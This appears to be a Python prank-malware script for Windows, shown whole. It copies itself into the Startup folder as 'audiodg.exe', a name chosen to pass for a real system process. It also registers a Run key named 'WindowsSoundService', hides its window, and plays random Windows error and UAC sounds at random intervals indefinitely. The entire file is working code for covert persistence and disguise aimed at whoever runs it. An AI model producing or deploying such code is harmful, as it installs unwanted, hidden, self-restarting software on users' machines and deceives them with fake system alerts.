import os
import time
import random
import sys
import shutil
from threading import Thread
import winreg as reg
import winsound


sound_files = [
    "Windows Ding.wav",
    "Windows Error.wav",
    "Windows Hardware Insert.wav",
    "Windows Notify Email.wav",
    "Windows User Account Control.wav"
]

startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
shutil.copy2(sys.argv[0], os.path.join(startup_path, "audiodg.exe"))

base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
sound_files = [os.path.join(base_path, f) for f in sound_files]

def add_to_startup():
    try:
        key = reg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with reg.OpenKey(key, key_path, 0, reg.KEY_SET_VALUE) as registry_key:
            reg.SetValueEx(registry_key, "WindowsSoundService", 0, reg.REG_SZ, sys.executable)
    except Exception as e:
        print(f"Startup registration failed: {e}")

def play_random_sound():
    while True:
        time.sleep(random.randint(1, 50))
        sound = random.choice(sound_files)
        try:
            winsound.PlaySound(sound, winsound.SND_FILENAME)
        except Exception as e:
            print(f"Failed to play sound: {e}")

try:
    import win32gui
    import win32con
    win = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(win, win32con.SW_HIDE)
except:
    pass

add_to_startup()

sound_thread = Thread(target=play_random_sound, daemon=True)
sound_thread.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    sys.exit()